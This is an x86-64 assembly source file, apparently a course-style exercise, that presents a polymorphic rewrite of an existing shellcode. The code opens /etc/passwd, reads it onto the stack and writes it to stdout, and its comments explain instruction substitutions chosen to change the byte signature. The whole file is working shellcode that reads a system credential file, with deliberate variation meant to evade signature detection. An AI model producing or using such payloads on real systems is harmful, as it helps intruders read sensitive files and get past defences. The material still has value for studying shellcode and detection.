BITS 64
; Polymorphic version of Mr. Un1k0d3rs /etc/passwd read shellcode
; Orig Size: 82 bytes
; Polymorphic size: 75 bytes
global _start

section .text

_start:
xor rax, rax
mov rsi, rax ; null out rsi
cdq ; null out rdx
inc al
inc al
jmp _push_filename
  
_readfile:
; syscall open file
pop rdi ; pop path value
xor byte [rdi + 11], 0x42
syscall
  
; syscall read file
xchg rdi, rax ; put new fd in rdi
mov rax, rdx ; rdx is still zero and can be used to null out rax
mov dx, 0xfff; size to read
sub sp, dx ; Make some space on the stack
push rsp
pop rsi ; rsi points to buffer on stack
syscall
  
; syscall write to stdout
mov rdx, rax ; rax contains the number of read bytes
xor rdi, rdi
push rdi
pop rax ; avoid xor rax,rax
inc rdi ; rdi contains stdout
inc al ; SYS_write
syscall
  
; syscall exit
xor rax, rax
add al, 60
syscall
  
_push_filename:
call _readfile
path: db "/etc/passwdB"
